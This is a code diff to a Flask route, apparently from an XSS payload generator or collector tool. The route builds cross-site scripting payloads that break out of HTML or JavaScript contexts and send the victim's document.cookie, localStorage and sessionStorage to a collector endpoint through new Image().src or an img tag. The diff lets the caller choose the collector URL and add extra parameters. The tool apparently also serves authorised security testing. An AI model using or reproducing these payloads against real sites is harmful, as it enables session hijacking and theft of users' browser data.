@@ -87,13 +87,28 @@ def catch_reflected_xss(guid):
 @login_required
 def gen_xss(id):
 
-    url = request.host_url
+    url = request.args.get('url')
     is_stored = request.args.get('stored')
     is_cookie = request.args.get('cookie')
     is_local_storage = request.args.get('session')
     is_session_storage = request.args.get('local')
     client = Client.query.filter_by(id=id).first_or_404()
     guid = client.guid
+    code_type = request.args.get('code')
+    other_data_dict = request.args.to_dict()
+    other_data = '"&'
+
+    for param, value in other_data_dict.items():
+        if not (param == 'url' or param == 'stored' or param == 'cookie' or param == 'session' or param == 'local' or param == 'code'):
+            other_data += '{}={}&'.format(param, value)
+
+    other_data = other_data.rstrip('&')
+    other_data += '"'
+
+    if code_type == 'js':
+        payload = """;}; """
+    else:
+        payload = """'>">"""
 
     if is_stored:
         xss_type = 'stored'
@@ -101,23 +116,42 @@ def gen_xss(id):
         xss_type = 'reflected'
 
     if is_cookie or is_local_storage or is_session_storage:
-        payload = """'>"><script>document.write('<img src="{}api/xss/{}/{}?""".format(
+
+        if code_type == 'html':
+            payload += """<script>"""
+
+        payload += """new Image().src="{}/api/xss/{}/{}?""".format(
             url, xss_type, guid)
 
         if is_cookie:
-            payload += """cookies=' + encodeURIComponent(document.cookie) + '"""
+            payload += """cookies="+encodeURIComponent(document.cookie)"""
 
         if is_local_storage:
-            payload += """&local_storage=' + encodeURIComponent(JSON.stringify(localStorage)) + '"""
+            if is_cookie:
+                payload += """+"&local_storage="+encodeURIComponent(JSON.stringify(localStorage))"""
+            else: 
+                payload += """local_storage="+encodeURIComponent(JSON.stringify(localStorage))"""
 
         if is_session_storage:
-            payload += """&session_storage=' + encodeURIComponent(JSON.stringify(sessionStorage)) + '"""
+            if is_cookie or is_local_storage:
+                payload += """+"&session_storage="+encodeURIComponent(JSON.stringify(sessionStorage))"""
+            else:
+                payload += """session_storage="+encodeURIComponent(JSON.stringify(sessionStorage))"""
 
-        payload += """" />')</script>"""
+        print(other_data)
+        if other_data != '""':
+            payload += "+" + other_data
+
+        if code_type == 'js':
+            payload += """;"""
+        else: 
+            payload += """</script>"""
 
     else:
-        payload = """'>"><img src="{}api/xss/{}/{}" />""".format(
-            url, xss_type, guid)
+        if other_data != '""':
+            payload += """<img src="{}/api/xss/{}/{}?{}" />""".format(url, xss_type, guid, other_data.lstrip('"').lstrip('&').rstrip('"'))
+        else:
+            payload += """<img src="{}/api/xss/{}/{}" />""".format(url, xss_type, guid)
 
     return (payload)
 
